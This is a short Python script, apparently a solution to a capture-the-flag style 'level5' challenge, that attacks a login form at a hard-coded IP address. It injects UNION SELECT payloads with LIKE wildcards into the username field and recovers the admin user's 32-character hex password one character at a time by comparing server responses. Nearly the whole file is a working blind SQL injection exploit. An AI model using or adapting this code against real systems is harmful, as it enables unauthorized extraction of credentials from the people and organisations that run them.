import requests

# url = 'http://51.68.174.216:5555/level4/'
url = 'http://51.68.174.216:5555/level5/'

passw = '%'
sb = "' UNION SELECT username, username, username FROM users WHERE password LIKE '"
se = "' AND username = 'admin' #"


def get():
    return {'username': sb + passw + se, 'password': ''}


num = 32
passw = '_' * (num + 1)

bad = requests.post(url, data=get()).text

passw = ''
for i in range(num):
    for c in range(0, 16):
        op = passw
        passw += hex(c)[2:] + '%'
        if requests.post(url, data=get()).text != bad:
            passw = passw[:-1]
            break
        passw = op
    print(passw)
